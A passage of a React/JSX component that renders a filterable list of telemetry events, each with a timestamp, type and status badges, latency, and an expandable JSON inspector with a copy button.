        <div className="space-y-2.5 max-h-[500px] overflow-y-auto pr-1">
          {filteredEvents.length === 0 ? (
            <div className="text-center py-12 text-xs text-gray-400 bg-gray-50 rounded-xl border border-dashed border-gray-200 italic">
              No telemetry events match your search query or filters.
            </div>
          ) : (
            filteredEvents.map((ev) => {
              const isExpanded = expandedEventId === ev.id;
              const formattedTime = new Date(ev.timestamp).toLocaleTimeString();
              return (
                <div
                  key={ev.id}
                  className="bg-white border border-gray-200 hover:border-gray-300 rounded-xl p-3.5 transition shadow-2xs hover:shadow-xs space-y-2"
                >
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                    <div className="flex flex-wrap items-center gap-2">
                      <span className="font-mono text-[11px] font-bold text-gray-500 bg-gray-100 px-2 py-0.5 rounded">
                        {formattedTime}
                      </span>
                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full border ${getEventTypeBadge(ev.eventType)}`}>
                        {ev.eventType}
                      </span>
                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full border ${getStatusBadge(ev.status)}`}>
                        {ev.status}
                      </span>
                      <span className="font-mono text-xs font-semibold text-gray-900">
                        {ev.propertyNode}
                      </span>
                    </div>

                    <div className="flex items-center gap-3 shrink-0 text-xs">
                      <span className="font-mono font-bold text-emerald-700">
                        ⚡ {ev.latencyMs}ms
                      </span>
                      <button
                        type="button"
                        onClick={() => setExpandedEventId(isExpanded ? null : ev.id)}
                        className="text-[11px] font-bold text-indigo-600 hover:text-indigo-800 bg-indigo-50 hover:bg-indigo-100 px-2 py-1 rounded transition"
                      >
                        {isExpanded ? "Hide Payload ▲" : "Inspect Payload ▼"}
                      </button>
                    </div>
                  </div>

                  {/* Context Summary */}
                  {ev.details?.runtimeContext && (
                    <p className="text-xs text-gray-600 pl-1 leading-relaxed">
                      {ev.details.runtimeContext}
                    </p>
                  )}

                  {/* Expandable JSON Payload Inspector */}
                  {isExpanded && (
                    <div className="pt-2 border-t border-gray-100 space-y-2">
                      <div className="flex items-center justify-between text-[11px] text-gray-500">
                        <span className="font-mono">Payload Schema (ID: {ev.id})</span>
                        <button
                          type="button"
                          onClick={() => handleCopyPayload(ev.id, ev)}
                          className="px-2 py-0.5 text-[10px] font-bold bg-gray-100 hover:bg-gray-200 text-gray-700 rounded transition"
                        >
                          {copiedPayloadId === ev.id ? "✓ Copied" : "Copy Payload"}
                        </button>
                      </div>
                      <pre className="bg-gray-900 text-emerald-400 p-3 rounded-lg text-xs font-mono overflow-x-auto max-h-56 border border-gray-800 leading-relaxed select-all">
                        {JSON.stringify(ev, null, 2)}
                      </pre>
                    </div>
                  )}
                </div>
              );
            })
          )}
        </div>
      </div>
      </>
      )}
    </div>
  );
}
